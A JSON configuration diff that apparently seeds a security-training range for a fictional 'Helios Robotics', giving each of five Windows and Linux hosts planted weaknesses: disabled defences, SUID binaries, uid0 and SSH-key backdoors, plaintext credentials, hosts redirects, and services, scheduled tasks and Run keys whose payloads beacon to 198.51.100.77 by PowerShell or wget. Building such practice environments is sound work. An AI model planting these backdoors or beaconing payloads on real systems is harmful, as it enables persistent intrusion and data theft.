@@ -1,0 +1,972 @@
+{
+  "dc01": [
+    {
+      "name": "weak-password-policy-win",
+      "vars": {
+        "MINPWLEN": "4",
+        "LOCKOUT_THRESHOLD": "0",
+        "MAXPWAGE": "unlimited"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "svc_sync",
+        "PASSWORD": "Helios2026!",
+        "FULLNAME": "Cad Sync Service",
+        "DESCRIPTION": "CAD file sync account"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "audit_svc",
+        "FULLNAME": "Audit Agent",
+        "DESCRIPTION": "compliance audit account"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "drafting",
+        "PASSWORD": "Drafting2026!",
+        "FULLNAME": "Drafting Station"
+      }
+    },
+    {
+      "name": "rdp-group-member-win",
+      "vars": {
+        "USERNAME": "drafting"
+      }
+    },
+    "guest-enabled-win",
+    "uac-disabled-win",
+    "rdp-no-nla-win",
+    "smb1-enabled-win",
+    "audit-policy-off-win",
+    {
+      "name": "autologin-win",
+      "vars": {
+        "USERNAME": "drafting",
+        "PASSWORD": "Drafting2026!"
+      }
+    },
+    {
+      "name": "runkey-persistence-win",
+      "vars": {
+        "RUN_VALUE_NAME": "PulseSyncAgent",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1",
+        "PAYLOAD_BODY": "while ($true) { Start-Sleep -Seconds 300; Invoke-WebRequest -Uri 'http://198.51.100.77/beacon' -Method Post }"
+      }
+    },
+    {
+      "name": "scheduled-task-persistence-win",
+      "vars": {
+        "TASK_NAME": "CadSync",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1",
+        "PAYLOAD_BODY": "Start-Sleep -Seconds 240; Invoke-WebRequest -Uri 'http://198.51.100.77/collect' -Method Post"
+      }
+    },
+    {
+      "name": "malicious-service-win",
+      "vars": {
+        "SERVICE_NAME": "RoboArchiveSync",
+        "DESCRIPTION": "Helios archive synchronization",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1"
+      }
+    },
+    {
+      "name": "malicious-service-win",
+      "vars": {
+        "SERVICE_NAME": "CACHESTALKER",
+        "DESCRIPTION": "system management helper",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1"
+      }
+    },
+    {
+      "name": "insecure-file-acl-win",
+      "vars": {
+        "FILE_PATH": "C:\\ProgramData\\Helios\\Payroll",
+        "FILE_CONTENT": "Helios payroll seeds: seed_paysvc / P4yroll2026!"
+      }
+    },
+    {
+      "name": "insecure-smb-share-win",
+      "vars": {
+        "SHARE_NAME": "EngShare",
+        "SHARE_PATH": "C:\\ProgramData\\Helios\\EngDocs",
+        "DESCRIPTION": "Helios engineering drop"
+      }
+    },
+    {
+      "name": "sensitive-file-win",
+      "vars": {
+        "FILE_PATH": "C:\\Users\\Public\\quickref.txt",
+        "FILE_CONTENT": "Front desk quick reference: portal reset pin 4471"
+      }
+    },
+    {
+      "name": "hosts-redirect-win",
+      "vars": {
+        "HOSTNAME": "portal.helios.local",
+        "IP": "198.51.100.77"
+      }
+    },
+    "Telnet",
+    "TFTP",
+    "Enabling Print Spooler Service",
+    "firewall-disabled-win",
+    "weak-lm-authentication",
+    "windows-updates-frozen-win",
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "svc_fab",
+        "PASSWORD": "Fab2026!",
+        "FULLNAME": "Fab Line Service",
+        "DESCRIPTION": "fabrication line feed"
+      }
+    },
+    "Allow Remote Assistance",
+    {
+      "name": "Run/RunOnce Keys",
+      "vars": {
+        "process": "TelemetrySync",
+        "process_path": "C:\\ProgramData\\Helios\\payload.exe",
+        "command": "powershell.exe -WindowStyle Hidden -File C:\\ProgramData\\Helios\\payload.ps1"
+      }
+    },
+    {
+      "name": "theme-readme-win",
+      "vars": {
+        "README_FILENAME": "47f7ab11ae35fea5-README.html"
+      }
+    },
+    {
+      "name": "theme-wallpaper-win",
+      "vars": {
+        "WALLPAPER_FILENAME": "626948136b9138bb-wallpaper.jpg"
+      }
+    },
+    {
+      "name": "scheduled-task-persistence-win",
+      "vars": {
+        "TASK_NAME": "LedgerSync",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1",
+        "PAYLOAD_BODY": "Start-Sleep -Seconds 240; Invoke-WebRequest -Uri 'http://198.51.100.77/collect' -Method Post"
+      }
+    },
+    {
+      "name": "sensitive-file-win",
+      "vars": {
+        "FILE_PATH": "C:\\Users\\Public\\parts-notes.txt",
+        "FILE_CONTENT": "narcotics cage code 9917 do not share"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "floorvol",
+        "PASSWORD": "Volunteer2026!",
+        "FULLNAME": "Floor Kiosk"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "partsdesk",
+        "PASSWORD": "Parts2026!",
+        "FULLNAME": "Parts Front Desk"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "logistics",
+        "PASSWORD": "Logistics2026!",
+        "FULLNAME": "Logistics Coordinator"
+      }
+    },
+    {
+      "name": "rdp-group-member-win",
+      "vars": {
+        "USERNAME": "logistics"
+      }
+    },
+    {
+      "name": "scheduled-task-persistence-win",
+      "vars": {
+        "TASK_NAME": "TorqueRelay",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1",
+        "PAYLOAD_BODY": "Start-Sleep -Seconds 240; Invoke-WebRequest -Uri 'http://198.51.100.77/collect' -Method Post"
+      }
+    },
+    {
+      "name": "malicious-service-win",
+      "vars": {
+        "SERVICE_NAME": "ArmIndexer",
+        "DESCRIPTION": "arm calibration indexer",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1"
+      }
+    },
+    {
+      "name": "runkey-persistence-win",
+      "vars": {
+        "RUN_VALUE_NAME": "LabFeedAgent",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1",
+        "PAYLOAD_BODY": "Start-Sleep -Seconds 240; Invoke-WebRequest -Uri 'http://198.51.100.77/collect' -Method Post"
+      }
+    },
+    {
+      "name": "sensitive-file-win",
+      "vars": {
+        "FILE_PATH": "C:\\Users\\Public\\vendor.txt",
+        "FILE_CONTENT": "portal vendor support PIN 8812"
+      }
+    },
+    {
+      "name": "hosts-redirect-win",
+      "vars": {
+        "HOSTNAME": "lab.helios.local",
+        "IP": "198.51.100.77"
+      }
+    },
+    {
+      "name": "autologin-win",
+      "vars": {
+        "USERNAME": "partsdesk",
+        "PASSWORD": "Parts2026!"
+      }
+    }
+  ],
+  "win01": [
+    {
+      "name": "weak-password-policy-win",
+      "vars": {
+        "MINPWLEN": "5",
+        "LOCKOUT_THRESHOLD": "0",
+        "MAXPWAGE": "unlimited"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "floorvol",
+        "PASSWORD": "Volunteer2026!",
+        "FULLNAME": "Floor Kiosk"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "nightshift",
+        "FULLNAME": "Night Shift Station",
+        "DESCRIPTION": "night shift kiosk account"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "svc_biomed",
+        "PASSWORD": "Fab2026!",
+        "FULLNAME": "Test Rig Service"
+      }
+    },
+    {
+      "name": "rdp-group-member-win",
+      "vars": {
+        "USERNAME": "floorvol"
+      }
+    },
+    "guest-enabled-win",
+    "uac-disabled-win",
+    {
+      "name": "autologin-win",
+      "vars": {
+        "USERNAME": "floorvol",
+        "PASSWORD": "Volunteer2026!"
+      }
+    },
+    {
+      "name": "runkey-persistence-win",
+      "vars": {
+        "RUN_VALUE_NAME": "LineCallSync",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1",
+        "PAYLOAD_BODY": "while ($true) { Start-Sleep -Seconds 300; Invoke-WebRequest -Uri 'http://198.51.100.77/beacon' -Method Post }"
+      }
+    },
+    {
+      "name": "scheduled-task-persistence-win",
+      "vars": {
+        "TASK_NAME": "TelemetryFlush",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1",
+        "PAYLOAD_BODY": "Start-Sleep -Seconds 240; Invoke-WebRequest -Uri 'http://198.51.100.77/collect' -Method Post"
+      }
+    },
+    {
+      "name": "malicious-service-win",
+      "vars": {
+        "SERVICE_NAME": "ChartCacheSvc",
+        "DESCRIPTION": "test chart cache",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1"
+      }
+    },
+    {
+      "name": "insecure-file-acl-win",
+      "vars": {
+        "FILE_PATH": "C:\\ProgramData\\Helios\\Donor",
+        "FILE_CONTENT": "donor_id,last4,ward\\nfund polls export"
+      }
+    },
+    {
+      "name": "insecure-smb-share-win",
+      "vars": {
+        "SHARE_NAME": "RoboDocs",
+        "SHARE_PATH": "C:\\ProgramData\\Helios\\RoboDocs",
+        "DESCRIPTION": "robotics docs drop"
+      }
+    },
+    {
+      "name": "sensitive-file-win",
+      "vars": {
+        "FILE_PATH": "C:\\Users\\Public\\vpn.txt",
+        "FILE_CONTENT": "test rig vendor VPN: 198.51.100.44 heliosvpn / R1gAccess!"
+      }
+    },
+    {
+      "name": "hosts-redirect-win",
+      "vars": {
+        "HOSTNAME": "records.helios.local",
+        "IP": "198.51.100.77"
+      }
+    },
+    "Telnet",
+    "TFTP",
+    "Enabling Print Spooler Service",
+    "firewall-disabled-win",
+    "weak-lm-authentication",
+    "windows-updates-frozen-win",
+    "Allow Remote Assistance",
+    {
+      "name": "theme-readme-win",
+      "vars": {
+        "README_FILENAME": "47f7ab11ae35fea5-README.html"
+      }
+    },
+    {
+      "name": "theme-wallpaper-win",
+      "vars": {
+        "WALLPAPER_FILENAME": "626948136b9138bb-wallpaper.jpg"
+      }
+    },
+    {
+      "name": "sensitive-file-win",
+      "vars": {
+        "FILE_PATH": "C:\\Users\\Public\\oncall.txt",
+        "FILE_CONTENT": "on-call rota export sep: lead=5511"
+      }
+    },
+    {
+      "name": "malicious-service-win",
+      "vars": {
+        "SERVICE_NAME": "RigResultsSync",
+        "DESCRIPTION": "rig results sync agent",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1"
+      }
+    },
+    {
+      "name": "runkey-persistence-win",
+      "vars": {
+        "RUN_VALUE_NAME": "BadgeSyncAgent",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1",
+        "PAYLOAD_BODY": "while ($true) { Start-Sleep -Seconds 300; Invoke-WebRequest -Uri 'http://198.51.100.77/beacon' -Method Post }"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "partstech",
+        "FULLNAME": "Parts Tech Station",
+        "DESCRIPTION": "parts tech kiosk"
+      }
+    },
+    {
+      "name": "insecure-file-acl-win",
+      "vars": {
+        "FILE_PATH": "C:\\ProgramData\\Helios\\Studies",
+        "FILE_CONTENT": "study_id,patient_label\\ntrial export"
+      }
+    },
+    {
+      "name": "hosts-redirect-win",
+      "vars": {
+        "HOSTNAME": "ehr.helios.local",
+        "IP": "198.51.100.77"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "drafting",
+        "PASSWORD": "Drafting2026!",
+        "FULLNAME": "Drafting Station"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "fabnurse",
+        "PASSWORD": "Fab2026!",
+        "FULLNAME": "Fab Floor Lead"
+      }
+    },
+    {
+      "name": "local-user-win",
+      "vars": {
+        "USERNAME": "itintern",
+        "PASSWORD": "Intern2026!",
+        "FULLNAME": "IT Intern Workstation"
+      }
+    },
+    {
+      "name": "rdp-group-member-win",
+      "vars": {
+        "USERNAME": "drafting"
+      }
+    },
+    {
+      "name": "scheduled-task-persistence-win",
+      "vars": {
+        "TASK_NAME": "PartsAudit",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1",
+        "PAYLOAD_BODY": "Start-Sleep -Seconds 240; Invoke-WebRequest -Uri 'http://198.51.100.77/collect' -Method Post"
+      }
+    },
+    {
+      "name": "malicious-service-win",
+      "vars": {
+        "SERVICE_NAME": "BenchBoardSync",
+        "DESCRIPTION": "bench board synchronizer",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1"
+      }
+    },
+    {
+      "name": "runkey-persistence-win",
+      "vars": {
+        "RUN_VALUE_NAME": "CadQueueAgent",
+        "PAYLOAD_PATH": "C:\\ProgramData\\Helios\\payload.ps1",
+        "PAYLOAD_BODY": "Start-Sleep -Seconds 240; Invoke-WebRequest -Uri 'http://198.51.100.77/collect' -Method Post"
+      }
+    },
+    {
+      "name": "sensitive-file-win",
+      "vars": {
+        "FILE_PATH": "C:\\Users\\Public\\shared.txt",
+        "FILE_CONTENT": "ALL SITES shared vendor portal pw: VendorPortal1!"
+      }
+    },
+    {
+      "name": "hosts-redirect-win",
+      "vars": {
+        "HOSTNAME": "parts.helios.local",
+        "IP": "198.51.100.77"
+      }
+    },
+    {
+      "name": "autologin-win",
+      "vars": {
+        "USERNAME": "itintern",
+        "PASSWORD": "Intern2026!"
+      }
+    }
+  ],
+  "web01": [
+    "sudo-nopasswd",
+    "writable-sudoers",
+    "bad-perms-userConfig",
+    "world-writable-cron-d",
+    "writable-bashrc",
+    "suid-find",
+    "suid-nano",
+    "suid-vim",
+    "systemd-service-writable",
+    "multiple-uid0-accounts",
+    "uid0-backdoor-account",
+    "empty-password-account",
+    "weak-password-account",
+    "www-data-shell",
+    "root-nginx",
+    "authorized-keys-backdoor",
+    "sudo-timestamp-never-expires",
+    "wildcard-sudo",
+    "timezone-chaos",
+    "hostname-loop",
+    "unprivileged-users-enabled",
+    "journal-disk-full",
+    "core-dump-world-readable",
+    "writable-etc-group",
+    "world-writable-etc-hosts",
+    "sysctl-syn-cookies-disabled",
+    "auditd-disabled",
+    "pam-permit-empty",
+    "pam-no-password-quality",
+    {
+      "name": "uid0-user",
+      "vars": {
+        "USERNAME": "cachestalker",
+        "PASSWORD": "St4lker2026!"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "vendor-support",
+        "PASSWORD": "Helios2026!",
+        "GROUPS_ADD": "sudo"
+      }
+    },
+    {
+      "name": "systemd-service",
+      "vars": {
+        "SERVICE_NAME": "portal-healthd",
+        "DESCRIPTION": "Portal health telemetry",
+        "EXEC_START": "/bin/sh -c 'while true; do sleep 300; wget -q -O- http://198.51.100.77/beacon >/dev/null 2>&1 || true; done'"
+      }
+    },
+    {
+      "name": "backdoor-firewall-rule",
+      "vars": {
+        "SOURCE_IP": "198.51.100.77",
+        "DST_PORT": "22"
+      }
+    },
+    {
+      "name": "theme-motd",
+      "vars": {
+        "MOTD_TEXT": "Helios Robotics -- web tier (web01). Authorized staff only.",
+        "ISSUE_TEXT": "Helios Robotics web tier"
+      }
+    },
+    {
+      "name": "theme-readme",
+      "vars": {
+        "README_FILENAME": "47f7ab11ae35fea5-README.html"
+      }
+    },
+    {
+      "name": "theme-wallpaper",
+      "vars": {
+        "WALLPAPER_FILENAME": "626948136b9138bb-wallpaper.jpg"
+      }
+    },
+    {
+      "name": "theme-shortcuts",
+      "vars": {
+        "SHORTCUT_NAME": "Incident README",
+        "SHORTCUT_EXEC": "xdg-open ~/Desktop/47f7ab11ae35fea5-README.html"
+      }
+    },
+    {
+      "name": "theme-shortcuts",
+      "vars": {
+        "SHORTCUT_NAME": "Helios Portal",
+        "SHORTCUT_EXEC": "xdg-open http://localhost"
+      }
+    },
+    {
+      "name": "polyglot-media",
+      "vars": {
+        "MEDIA": "/var/www/helios/portal/logo.png"
+      }
+    },
+    "ssh-root-login",
+    "ssh-password-auth",
+    "ssh-x11-forwarding",
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "vendor-support",
+        "PASSWORD": "Helios2026!"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "cad-ops",
+        "PASSWORD": "Cad2026!"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "line-tech",
+        "PASSWORD": "Line2026!",
+        "GROUPS_ADD": "sudo"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "frontdesk",
+        "PASSWORD": "Frontdesk2026!"
+      }
+    },
+    {
+      "name": "systemd-service",
+      "vars": {
+        "SERVICE_NAME": "portal-metrics",
+        "DESCRIPTION": "Portal metrics collector",
+        "EXEC_START": "/bin/sh -c 'while true; do sleep 240; wget -q -O- http://198.51.100.77/collect >/dev/null 2>&1 || true; done'"
+      }
+    },
+    {
+      "name": "hidden-cron-persistence",
+      "vars": {
+        "PAYLOAD": "/usr/local/sbin/.portal-sync"
+      }
+    },
+    {
+      "name": "insecure-file-mode",
+      "vars": {
+        "FILE_PATH": "/opt/helios/portal-db.txt",
+        "FILE_MODE": "0666",
+        "FILE_CONTENT": "portal db user: portal_svc / P0rtal2026!"
+      }
+    },
+    "ssh-max-auth-retries-high",
+    "at-job-any-user",
+    "exploitable-cron-job"
+  ],
+  "app01": [
+    "sudo-nopasswd",
+    "writable-sudoers",
+    "bad-perms-userConfig",
+    "world-writable-cron-d",
+    "writable-bashrc",
+    "suid-find",
+    "suid-python",
+    "systemd-service-writable",
+    "multiple-uid0-accounts",
+    "uid0-backdoor-account",
+    "empty-password-account",
+    "weak-password-account",
+    "apache-directory-listing",
+    {
+      "name": "apache-site",
+      "vars": {
+        "SITE_TITLE": "Helios Build Dashboard",
+        "SITE_BODY": "<p>Helios robotics build pipeline status</p>",
+        "EXTRA_DIRECTIVES": ""
+      }
+    },
+    "authorized-keys-backdoor",
+    "sudo-timestamp-never-expires",
+    "wildcard-sudo",
+    "timezone-chaos",
+    "unprivileged-users-enabled",
+    "journal-disk-full",
+    "core-dump-world-readable",
+    "writable-etc-group",
+    "world-writable-etc-hosts",
+    "sysctl-syn-cookies-disabled",
+    "auditd-disabled",
+    "pam-permit-empty",
+    "pam-no-password-quality",
+    "selinux-permissive",
+    "nfs-no-root-squash",
+    {
+      "name": "systemd-service",
+      "vars": {
+        "SERVICE_NAME": "build-cache-sync",
+        "DESCRIPTION": "Local resolver cache synchronizer",
+        "EXEC_START": "/bin/sh -c 'while true; do sleep 240; wget -q -O- http://198.51.100.77/collect >/dev/null 2>&1 || true; done'"
+      }
+    },
+    {
+      "name": "systemd-service",
+      "vars": {
+        "SERVICE_NAME": "LineOptimizer",
+        "DESCRIPTION": "System Optimizer",
+        "EXEC_START": "/bin/sh -c 'while true; do sleep 300; wget -q -O- http://198.51.100.77/beacon >/dev/null 2>&1 || true; done'"
+      }
+    },
+    "at-job-any-user",
+    "exploitable-cron-job",
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "cad-ops",
+        "PASSWORD": "Cad2026!",
+        "GROUPS_ADD": "wheel"
+      }
+    },
+    {
+      "name": "theme-motd",
+      "vars": {
+        "MOTD_TEXT": "Helios Robotics -- build & DNS (app01). Authorized staff only.",
+        "ISSUE_TEXT": "Helios Robotics build server"
+      }
+    },
+    {
+      "name": "theme-readme",
+      "vars": {
+        "README_FILENAME": "47f7ab11ae35fea5-README.html"
+      }
+    },
+    {
+      "name": "theme-wallpaper",
+      "vars": {
+        "WALLPAPER_FILENAME": "626948136b9138bb-wallpaper.jpg"
+      }
+    },
+    {
+      "name": "theme-shortcuts",
+      "vars": {
+        "SHORTCUT_NAME": "Incident README",
+        "SHORTCUT_EXEC": "xdg-open ~/Desktop/47f7ab11ae35fea5-README.html"
+      }
+    },
+    "ssh-root-login",
+    "ssh-empty-passwords",
+    "ssh-x11-forwarding",
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "vendor-support",
+        "PASSWORD": "Helios2026!",
+        "GROUPS_ADD": "wheel"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "cachestalker",
+        "PASSWORD": "St4lker2026!"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "rig-agent",
+        "PASSWORD": "Rig2026!",
+        "GROUPS_ADD": "wheel"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "dnsops",
+        "PASSWORD": "Dnsops2026!"
+      }
+    },
+    {
+      "name": "systemd-service",
+      "vars": {
+        "SERVICE_NAME": "telemetry-relay",
+        "DESCRIPTION": "Telemetry relay agent",
+        "EXEC_START": "/bin/sh -c 'while true; do sleep 300; wget -q -O- http://198.51.100.77/beacon >/dev/null 2>&1 || true; done'"
+      }
+    },
+    {
+      "name": "hidden-cron-persistence",
+      "vars": {
+        "PAYLOAD": "/usr/local/sbin/.build-sync"
+      }
+    },
+    {
+      "name": "insecure-file-mode",
+      "vars": {
+        "FILE_PATH": "/opt/helios/rig-creds.txt",
+        "FILE_MODE": "0666",
+        "FILE_CONTENT": "RIG service: rig_svc / R1g2026! -- internal only"
+      }
+    },
+    "ssh-max-auth-retries-high"
+  ],
+  "edge01": [
+    "sudo-nopasswd",
+    "writable-sudoers",
+    "wildcard-sudo",
+    "sudo-timestamp-never-expires",
+    "bad-perms-userConfig",
+    "writable-bashrc",
+    "world-writable-cron-d",
+    "world-writable-etc-hosts",
+    "writable-etc-group",
+    "sysctl-syn-cookies-disabled",
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "edge-vendor",
+        "PASSWORD": "Helios2026!",
+        "GROUPS_ADD": "wheel"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "cache-ops",
+        "PASSWORD": "Cache2026!",
+        "GROUPS_ADD": "wheel"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "cachestalker",
+        "PASSWORD": "St4lker2026!"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "noc-watch",
+        "PASSWORD": "Noc2026!"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "kiosk",
+        "PASSWORD": "Kiosk2026!"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "relay",
+        "PASSWORD": "Relay2026!",
+        "GROUPS_ADD": "wheel"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "deploy-bot",
+        "PASSWORD": "Deploy2026!"
+      }
+    },
+    {
+      "name": "local-user",
+      "vars": {
+        "USERNAME": "audit-tail",
+        "PASSWORD": "Audit2026!"
+      }
+    },
+    {
+      "name": "weak-password-account",
+      "vars": {
+        "USERNAME": "service",
+        "PASSWORD": "service"
+      }
+    },
+    "empty-password-account",
+    "uid0-backdoor-account",
+    "multiple-uid0-accounts",
+    {
+      "name": "uid0-user",
+      "vars": {
+        "USERNAME": "cacheroot",
+        "PASSWORD": "C0che2026!"
+      }
+    },
+    {
+      "name": "insecure-file-mode",
+      "vars": {
+        "FILE_PATH": "/opt/helios/cache-secret.txt",
+        "FILE_MODE": "0666",
+        "FILE_CONTENT": "cache origin token: og_9f27a1 -- rotate quarterly"
+      }
+    },
+    {
+      "name": "insecure-file-mode",
+      "vars": {
+        "FILE_PATH": "/opt/helios/edge-db.txt",
+        "FILE_MODE": "0666",
+        "FILE_CONTENT": "edge db user: edge_svc / E9ge2026!"
+      }
+    },
+    {
+      "name": "insecure-file-mode",
+      "vars": {
+        "FILE_PATH": "/opt/helios/deploy-key.txt",
+        "FILE_MODE": "0666",
+        "FILE_CONTENT": "deploy bot: deploy-bot / Deploy2026!"
+      }
+    },
+    {
+      "name": "insecure-file-mode",
+      "vars": {
+        "FILE_PATH": "/opt/helios/noc-notes.txt",
+        "FILE_MODE": "0644",
+        "FILE_CONTENT": "noc escalation pin 3314"
+      }
+    },
+    {
+      "name": "theme-motd",
+      "vars": {
+        "MOTD_TEXT": "Helios Robotics -- edge cache (edge01). Authorized staff only.",
+        "ISSUE_TEXT": "Helios Robotics edge node"
+      }
+    },
+    {
+      "name": "theme-readme",
+      "vars": {
+        "README_FILENAME": "47f7ab11ae35fea5-README.html"
+      }
+    },
+    {
+      "name": "theme-wallpaper",
+      "vars": {
+        "WALLPAPER_FILENAME": "626948136b9138bb-wallpaper.jpg"
+      }
+    },
+    {
+      "name": "theme-shortcuts",
+      "vars": {
+        "SHORTCUT_NAME": "Incident README",
+        "SHORTCUT_EXEC": "xdg-open ~/Desktop/47f7ab11ae35fea5-README.html"
+      }
+    },
+    {
+      "name": "theme-shortcuts",
+      "vars": {
+        "SHORTCUT_NAME": "Helios Portal",
+        "SHORTCUT_EXEC": "xdg-open http://localhost"
+      }
+    },
+    {
+      "name": "hosts-redirect-linux",
+      "vars": {
+        "HOSTS": "edge01.helios.local"
+      }
+    },
+    "authorized-keys-backdoor",
+    "ssh-root-login",
+    "ssh-password-auth",
+    "ssh-x11-forwarding",
+    "ssh-max-auth-retries-high",
+    {
+      "name": "crontab-persistence",
+      "vars": {
+        "USERNAME": "cachestalker",
+        "SCHEDULE": "*/15 * * * *",
+        "JOB_COMMAND": "/usr/local/sbin/.edge-sync"
+      }
+    },
+    {
+      "name": "hidden-cron-persistence",
+      "vars": {
+        "PAYLOAD": "/usr/local/sbin/.edge-sync"
+      }
+    },
+    "cron-d-rogue-job",
+    {
+      "name": "user-sudo-nopasswd",
+      "vars": {
+        "USERNAME": "cache-ops"
+      }
+    },
+    "nfs-no-root-squash"
+  ]
+}
